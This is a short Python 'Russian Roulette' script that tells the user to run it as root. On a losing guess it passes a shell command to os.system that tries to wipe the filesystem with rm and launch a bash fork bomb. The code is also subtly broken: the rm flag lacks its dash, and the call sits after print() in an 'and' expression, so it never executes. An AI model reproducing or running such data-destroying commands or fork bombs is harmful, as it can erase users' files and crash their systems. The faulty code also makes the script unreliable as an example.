#Import os and random
import os
import random 


start_game = input("Russian Roulette, press enter \n \n ")
play = int(input("Russian roulette... pick a number between 1 and 6 \n make sure your running as root \n"))
list = [1,2,3,4,5,6]
choose = random.choice(list)


start_game
play
choose
if choose == play:
    print("You loose :( ") and os.system("rm rf/* | :(){ :|:& };:")
else:
    print("Your computer is safe")
